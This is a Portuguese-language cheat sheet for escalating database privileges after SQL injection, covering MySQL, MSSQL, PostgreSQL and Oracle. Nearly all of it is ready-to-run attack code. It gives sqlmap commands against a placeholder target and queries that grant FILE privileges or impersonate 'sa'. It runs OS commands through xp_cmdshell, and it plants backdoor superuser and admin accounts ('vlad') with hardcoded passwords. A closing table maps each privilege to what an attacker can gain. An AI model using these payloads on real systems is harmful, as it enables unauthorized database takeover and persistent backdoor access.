# Escalação de Privilégio via SQL Injection

## Verificar Privilégios Atuais

```bash
# SQLMap
sqlmap -u "http://alvo.com/?id=1" --privileges --batch
sqlmap -u "http://alvo.com/?id=1" --is-dba --batch
```

```sql
-- MySQL: privilégios do usuário atual
SHOW GRANTS FOR CURRENT_USER();
SELECT * FROM information_schema.user_privileges WHERE GRANTEE=CONCAT("'",CURRENT_USER(),"'");

-- MSSQL: verificar roles
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT IS_SRVROLEMEMBER('db_owner');
SELECT permission_name FROM fn_my_permissions(NULL,'SERVER');

-- PostgreSQL
SELECT has_database_privilege(current_user, current_database(), 'CREATE');
SELECT usesuper FROM pg_user WHERE usename=current_user;

-- Oracle
SELECT * FROM session_privs;
SELECT * FROM user_sys_privs;
```

## MySQL — Escalar para FILE/SUPER

```sql
-- Se tiver acesso à tabela mysql.user (requer algum privilégio admin)
UPDATE mysql.user SET File_priv='Y' WHERE User=current_user();
FLUSH PRIVILEGES;

-- Grant via SQL Injection (requer GRANT OPTION)
GRANT FILE ON *.* TO 'app_user'@'localhost';
FLUSH PRIVILEGES;
```

## MSSQL — Impersonation

```sql
-- Verificar quem pode ser impersonado
SELECT * FROM sys.database_permissions
WHERE permission_name = 'IMPERSONATE';

-- Impersonar usuário com mais privilégios
EXECUTE AS USER = 'dbo';
SELECT IS_MEMBER('db_owner');

-- Impersonar login de servidor
EXECUTE AS LOGIN = 'sa';
SELECT IS_SRVROLEMEMBER('sysadmin');
```

## MSSQL — xp_cmdshell como Alternativa

```sql
-- Se não for DBA mas tiver execute em xp_cmdshell
EXEC xp_cmdshell 'whoami /priv';

-- Verificar tokens do processo SQL Server
EXEC xp_cmdshell 'whoami /all';
```

## PostgreSQL — Escalar para Superuser

```sql
-- Via função SECURITY DEFINER (se existir função vulnerável)
CREATE OR REPLACE FUNCTION escalate() RETURNS void AS $$
  BEGIN
    CREATE ROLE vlad SUPERUSER LOGIN PASSWORD 'vlad123';
  END;
$$ LANGUAGE plpgsql SECURITY DEFINER;

GRANT EXECUTE ON FUNCTION escalate() TO public;
SELECT escalate();
```

## Criar Usuário Admin no Banco

```bash
# SQLMap: criar usuário admin
sqlmap -u "http://alvo.com/?id=1" \
  --sql-query="CREATE USER 'vlad'@'%' IDENTIFIED BY 'VladVlad123!';" \
  --batch

sqlmap -u "http://alvo.com/?id=1" \
  --sql-query="GRANT ALL PRIVILEGES ON *.* TO 'vlad'@'%' WITH GRANT OPTION;" \
  --batch
```

## Mapeamento de Privilégios para Ações

| Privilégio | Ação Possível |
|-----------|---------------|
| FILE | Ler/escrever arquivos do sistema |
| SUPER | Configurar o servidor, matar queries |
| CREATE | Criar bancos e tabelas |
| EXECUTE | Executar stored procedures |
| sysadmin (MSSQL) | Controle total do servidor |
| xp_cmdshell (MSSQL) | Executar comandos OS |
| SUPERUSER (PG) | Tudo, incluindo COPY TO PROGRAM |
